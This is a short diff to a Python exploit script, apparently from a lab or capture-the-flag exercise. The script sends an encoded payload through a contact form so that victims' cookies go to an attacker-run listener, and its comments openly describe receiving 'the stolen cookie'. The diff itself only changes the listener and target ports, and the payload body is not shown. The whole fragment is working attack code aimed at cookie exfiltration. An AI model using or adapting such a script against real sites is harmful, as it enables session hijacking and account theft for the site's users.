@@ -2,7 +2,8 @@ import requests
 
 # start a listener and insert the host here to receive the stolen cookie.
 # also possible to use a service such as ngrok if desired
-HOST = "http://[REDACTED]:9999"
+#HOST = "http://[REDACTED]:9999"
+HOST = "http://[REDACTED]:12345"
 
 # html encode every character in a provided string
 def html_encode(string):
@@ -30,5 +31,6 @@ data = {
         "message": payload
 }
 
-res = requests.post("http://localhost:8080/contact", json=data)
+#res = requests.post("http://localhost:8080/contact", json=data)
+res = requests.post("http://localhost:12345/contact", json=data)
 print(res.text)
